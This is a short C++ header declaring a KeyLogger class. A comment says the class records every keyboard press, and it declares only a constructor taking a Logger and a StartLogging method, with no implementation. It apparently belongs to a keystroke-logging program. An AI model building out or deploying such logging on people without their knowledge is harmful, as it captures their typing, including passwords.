#pragma once

#include <string>
#include <iostream>
#include <fstream>
#include "Logger.h"

using namespace std;

/*
	Responsible for logging all the user keyboard presses
*/
class KeyLogger
{
private:
	Logger* logger;

public:
	KeyLogger(Logger* logger);
	void StartLogging();
};

